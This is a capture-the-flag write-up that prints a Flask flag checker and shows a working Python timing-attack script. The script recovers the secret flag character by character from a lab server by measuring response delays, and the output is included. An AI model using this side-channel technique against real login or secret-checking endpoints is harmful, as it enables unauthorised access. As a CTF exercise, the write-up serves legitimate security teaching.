# silly - 400 points

192.168.40.199 8300

The server code is given to us as such.

```py
from flask import Flask, request, Response
from flask_cors import CORS
from hashlib import md5
import time

app = Flask(__name__)
CORS(app)

def get_flag_length():
    time.sleep(0.05) # Throttling against brute-forcers
    flag = open('../flag.txt','r').read()
    return len(flag)

def get_flag_char(i):
    flag = open('../flag.txt','r').read()
    return flag[i].encode()

def checkflag(userflag):
    for i, c in enumerate(userflag):
        if get_flag_length() <= i:
            return False

        if c.encode() != get_flag_char(i):
            return False

    if get_flag_length() != len(userflag):
        return False

    return True

@app.route("/", methods=['GET'])
def index():
    userflag = request.args.get('flag')
    if not userflag:
        return Response("Missing flag", status=401)

    if checkflag(userflag):
        return Response("YOU DID IT!!!", status=200)
    else:
        return Response("Wrong flag. Characters supported: [a-z_{}]", status=401)

```

# Let's Begin

In order to get the flag, we need to pass the `checkflag` method.

The `index` method also gives us the clue to the characters in the flag.
```py
return Response("Wrong flag. Characters supported: [a-z_{}]", status=401)
```

In the `checkflag` method, it checks for every character if  `get_flag_length() <= i`.

We can see a bruteforce preventive measure in the function.
```py
time.sleep(0.05) # Throttling against brute-forcers
```

However, due to multiple uses of `get_flag_length` in the `checkflag` method, this could cause a delayed response when we entered a wrong character vs the correct character. The correct character will incur a longer delay.

Thus we can perform a time based attack. The character which incurred the longest delay would be the right one.

```py
In [10]: import requests

In [11]: payload = {'flag': 'a'}

In [12]: response = requests.get('http://192.168.40.199:8300', params=payload)

In [13]: response.text
Out[13]: 'Wrong flag. Characters supported: [a-z_{}]'

```

So we know that the flag contains lower case alphabets, curly braces and underscores.

So to do the time based attack, we can

```py
In [28]: import string

In [29]: import requests

In [30]: characters = [ch for ch in string.ascii_lowercase] + ['{', '}', '+']

In [31]: found = []

In [32]: while '}' not in found:
    ...:     longest_time = 0
    ...:     character = '0'
    ...:     for ch in characters:
    ...:         payload = {'flag': ''.join(found) + ch}
    ...:         response = requests.get('http://192.168.40.199:8300', params=payload)
    ...:         seconds = response.elapsed.total_seconds()
    ...:         if seconds > longest_time:
    ...:             longest_time = seconds
    ...:             character = ch
    ...:     found.append(character)
    ...:     print(''.join(found))
    ...:
i
iv
ivy
ivyc
ivyct
ivyctf
ivyctf{
ivyctf{c
ivyctf{ca
ivyctf{can
ivyctf{can}
```

And we got the flag.